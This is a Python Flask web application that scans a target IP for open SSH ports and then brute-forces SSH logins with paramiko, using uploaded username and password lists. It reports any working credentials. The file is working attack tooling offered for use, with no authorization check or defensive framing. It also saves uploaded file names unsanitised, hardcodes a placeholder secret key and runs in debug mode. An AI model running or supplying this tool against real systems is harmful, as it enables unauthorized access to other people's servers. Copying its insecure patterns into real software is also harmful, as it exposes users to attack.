import os
import socket
import paramiko
from flask import Flask, render_template, request, redirect, url_for, flash

# Initialize the Flask app
app = Flask(__name__)
app.secret_key = 'your_secret_key'  # Set a secret key for session management

# Set upload folder and allowed file extensions
UPLOAD_FOLDER = 'uploads/'
ALLOWED_EXTENSIONS = {'txt'}

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# Ensure the uploads directory exists
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# Helper function to check allowed file types
def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

# Port scanning function
def scan_ports(target_ip, port_range):
    open_ports = []
    print(f"Starting port scan on {target_ip}...")
    for port in port_range:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target_ip, port))
        if result == 0:
            open_ports.append(port)
            print(f"Port {port} is open")
        sock.close()
    return open_ports

# SSH brute-force function
def ssh_bruteforce(target_ip, username_file, password_file, open_ports):
    credentials = None  # Store successful login credentials

    with open(username_file, 'r') as file:
        usernames = [line.strip() for line in file.readlines()]

    with open(password_file, 'r') as file:
        passwords = [line.strip() for line in file.readlines()]

    for port in open_ports:
        for username in usernames:
            for password in passwords:
                print(f"Trying Username: {username} with Password: {password} on Port: {port}")
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    client.connect(target_ip, username=username, password=password, port=port)
                    print(f"Success! Username: {username}, Password: {password} on Port: {port}")
                    credentials = (username, password, port)
                    client.close()
                    return credentials  # Exit after first successful login
                except paramiko.AuthenticationException:
                    print(f"Failed login for {username} with password '{password}' on Port: {port}")
                except Exception as e:
                    print(f"Error: {str(e)}")
                finally:
                    client.close()
    return credentials

# Flask routes
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        target_ip = request.form['target_ip']
        port_range = range(22, 23)  # You can modify this range

        # Handle file uploads
        if 'username_file' not in request.files or 'password_file' not in request.files:
            flash('No file part')
            return redirect(request.url)

        username_file = request.files['username_file']
        password_file = request.files['password_file']

        # Check if the uploaded files are allowed
        if username_file and allowed_file(username_file.filename) and password_file and allowed_file(password_file.filename):
            username_path = os.path.join(app.config['UPLOAD_FOLDER'], username_file.filename)
            password_path = os.path.join(app.config['UPLOAD_FOLDER'], password_file.filename)

            username_file.save(username_path)
            password_file.save(password_path)

            # Perform port scan
            open_ports = scan_ports(target_ip, port_range)
            if open_ports:
                flash(f"Open ports found: {open_ports}")
                # Perform SSH brute-force attack
                credentials = ssh_bruteforce(target_ip, username_path, password_path, open_ports)
                return render_template('index.html', target_ip=target_ip, open_ports=open_ports, credentials=credentials)
            else:
                flash("No open ports found.")
                return render_template('index.html')

    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)
